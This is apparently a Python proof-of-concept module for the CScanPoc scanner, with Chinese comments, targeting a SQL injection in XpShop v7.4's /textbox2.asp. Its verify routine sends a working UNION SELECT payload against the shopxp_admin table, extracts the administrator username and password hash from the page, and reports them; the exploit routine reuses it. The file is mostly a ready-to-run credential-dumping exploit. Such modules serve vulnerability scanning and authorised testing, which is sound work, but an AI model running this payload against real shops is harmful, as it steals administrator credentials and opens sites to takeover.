# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'XpShop_0101'  # 平台漏洞编号，留空
    name = 'XpShop v7.4 /textbox2.asp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-30'  # 漏洞公布时间
    desc = '''
        XpShop是深圳市新普软件开发有限公司自主研发的一套网店系统,针对不同类型的客户,有不同级别的系统。
        XpShop v7.4 /textbox2.asp SQL注入漏洞 EXP
    '''  # 漏洞描述
    ref = 'http://www.webshell.cc/1154.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'XpShop(新普)'  # 漏洞应用名称
    product_version = '7.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '85f86bf1-6bca-4569-bc30-75c2d29d16c9'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
                       "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
            verify_url = self.target + payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(
                r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>', re.I | re.S)
            match = pattern.match(content)
            if match == None or match.group('account').strip() == "":
                return
            account = match.group('account').strip()
            username = account[:-16]
            password = account[-16:]
            self.output.report(self.vuln, '发现{target}存在{name}漏洞;Username={username}, Password={passwd}'.format(
                target=self.target, name=self.vuln.name, username=username, passwd=password))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
